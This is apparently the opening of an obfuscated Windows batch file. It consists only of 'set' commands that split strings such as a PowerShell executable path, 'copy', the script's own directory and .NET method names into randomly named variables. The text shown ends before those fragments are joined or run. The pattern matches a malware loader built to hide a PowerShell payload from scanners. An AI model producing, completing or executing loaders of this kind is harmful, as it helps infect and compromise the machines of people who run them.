@echo off
set "mjXBXTPLXb=ll"
set "GuJFPTwODn= C"
set "RrQyFKHtTy=nd"
set "IXvAvEqVKO=he"
set "MkemiiXqHP=st"
set "jGoFYIblhA=32"
set "NsQeCtakwv=rS"
set "eqZJrdWiPV=co"
set "TWqNRdAafn=s\"
set "ANTgNfVyoA=do"
set "xYyHQMvpYM=we"
set "CFUUqycRiV=he"
set "AYguvBPAIX=Sy"
set "VdjrKJReFI=\W"
set "rDTJABtxIi=Wi"
set "KnoURLgrwd=\v"
set "uUCKlLjpQq=.e"
set "YeCTqVKFmv=1."
set "SgfHZikdDF=we"
set "fksqqZPVfz=in"
set "papMTvUAfb=rs"
set "QXjpHaGBiL=ll"
set "MzcKLuIBIK=po"
set "qDfVQyUcDi=py"
set "eWwYwZoYpZ=Po"
set "GiFCbKESox=ow"
set "AivHiSdEqr=xe"
set "XAjkoVacHB=em"
set "RotOOQjBxB=0\"
set "gMjhTUqSzF=ws"
set "TFZnHtEYLP=:\"
set "KDhczgdNOa= /"
set "FiCdGIcjIE=y "
set "bRFrDKFlEn= %~dp0"
set "pIDtoxTQMU=cd"
set "TbnwttojyY=$sPn"
set "JHSpnwtNWt=join"
set "gSjORAUquk=stem"
set "oIBQfnNJkF=n ''"
set "MmnYyofvMM=pose"
set "DHFIDrGnLd=v4Ir"
set "SlvJNyOorz=em.C"
set "fWQTcWnoac=tS46"
set "tfFCnVgZpV=ddin"
set "lRVDMMyStK=);$n"
set "IgzsfiNcnQ== $s"
set "IqaNcJyMWP=3HWs"
set "BZnTtnJMvI= if "
set "gabeghYcoi=.-16"
set "JzHTHbOpiz=sdov"
set "hpbATugHfs= [Sy"
set "nqtGvEMzqK=::De"
set "ECyOWEqkgJ=L = "
set "rPEqJJvnWN='[-1"
set "MKjSOErBLu=bjec"
set "urZBAbsjMs=ispo"
set "NEhubGASqx=bstr"
set "JkUrrrcCuE=.IO."
set "eeHwZucwUP=ptog"
set "ELXYTXnFqm=DIcS"
set "BHmrQXIaah== [S"
set "DdttGKWlfo=oin "
